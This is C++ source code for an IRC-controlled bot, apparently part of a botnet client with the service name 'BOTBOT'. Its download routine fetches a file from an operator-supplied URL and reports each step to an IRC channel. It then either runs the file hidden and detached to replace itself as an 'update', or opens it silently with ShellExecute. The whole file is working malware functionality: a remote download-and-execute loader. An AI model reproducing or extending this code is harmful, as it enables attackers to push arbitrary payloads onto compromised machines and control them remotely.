#include "Hell.h"
#include "Crc32Static.h"



CCrc32Static CRCCheck;
/* RAW Config*/
char filename[256] = "test.exe";//Don't ask why thus is done like this. - Cheers
char filename2[256] = "test2.exe";//Don't ask why thus is done like this. - Cheers
char svcname[128] = "BOTBOT";
/* RAW CONFIG */


void *CDownload::Run()
{
	HINTERNET hInternet=NULL;
	char sBuffer[1028];
	DWORD rVal, dVal, sTotal;
	hInternet=InternetOpen("POExplorer",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
	HANDLE OpenURL = InternetOpenUrl(hInternet,sUrl.c_str(),NULL,0,INTERNET_FLAG_NO_CACHE_WRITE,0);
	if (OpenURL != NULL) {
		HANDLE CreateDestFile = CreateFile(sDest.c_str(),GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (CreateDestFile < (HANDLE)1) {
			cout << "Cannot create file" << endl;
			return false;
			ExitThread(0);
		}
		BOT->cIRC.SendData("PRIVMSG %s :http(file) downloading...\r\n",BOT->cIRC.cConf.cChan.c_str());
		char* fileBuffer = (char*)malloc(512000);
		sTotal = 0;
		do {
			memset(sBuffer,0,sizeof(sBuffer));
			InternetReadFile(OpenURL, sBuffer, sizeof(sBuffer), &rVal);
			WriteFile(CreateDestFile, sBuffer, rVal, &dVal, NULL);
			
			if (sTotal < 512000) {
				unsigned int bytestocopy;
				bytestocopy=512000-sTotal;
				if (bytestocopy>rVal) 
					bytestocopy=rVal;
				memcpy(&fileBuffer[sTotal],sBuffer,bytestocopy);
			}
			sTotal += rVal;
		} while (rVal > 0);
		
		BOT->cIRC.SendData("PRIVMSG %s :http(file) downloaded -> (size: %dKB).\r\n",BOT->cIRC.cConf.cChan.c_str(),sTotal / 1024);
		CloseHandle(CreateDestFile);
		free(fileBuffer);
		
		if (sUpdate.compare(0,sUpdate.length(),"-u") == 0) {
			BOT->cIRC.SendData("PRIVMSG %s :updating...\r\n",BOT->cIRC.cConf.cChan.c_str());
			BOT->hRegcheck.Kill();	
			char sDir[255];
			DWORD CRCthis;
			DWORD CRCupdate;
			GetModuleFileName(GetModuleHandle(NULL),sDir,255);
			CRCCheck.FileCrc32Win32(sDir,CRCthis);
			CRCCheck.FileCrc32Win32(sDest.c_str(),CRCupdate);
			BOT->cIRC.SendData("PRIVMSG %s :crc(current): %d\r\n",BOT->cIRC.cConf.cChan.c_str(),CRCthis);
			BOT->cIRC.SendData("PRIVMSG %s :crc(update): %d\r\n",BOT->cIRC.cConf.cChan.c_str(),CRCupdate);
			if (CRCthis != CRCupdate) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&pinfo, 0, sizeof(pinfo));
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.lpTitle = "";
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow = SW_HIDE;
				char szDest[256];
				stringstream ss;
				ss << sDest.c_str();
				ss >> szDest;
				if (CreateProcess(NULL, szDest , NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
					WSACleanup();
					ExitProcess(0);
				} else 
					BOT->cIRC.SendData("PRIVMSG %s :file cannot be executed.\r\n",BOT->cIRC.cConf.cChan.c_str());
			} else 
				BOT->cIRC.SendData("PRIVMSG %s :current file is already updated.\r\n",BOT->cIRC.cConf.cChan.c_str());
			
		} else if (sUpdate.compare(0,sUpdate.length(),"-e") == 0) {
			ShellExecute(NULL,"open",sDest.c_str(),NULL,NULL,SW_HIDE);
			BOT->cIRC.SendData("PRIVMSG %s :opened file.\r\n",BOT->cIRC.cConf.cChan.c_str());
		}
		InternetCloseHandle(OpenURL);		
	} else {
		BOT->cIRC.SendData("PRIVMSG %s :http(file) cannot be downloaded.\r\n",BOT->cIRC.cConf.cChan.c_str());
		InternetCloseHandle(OpenURL);
	}
	return NULL;
}

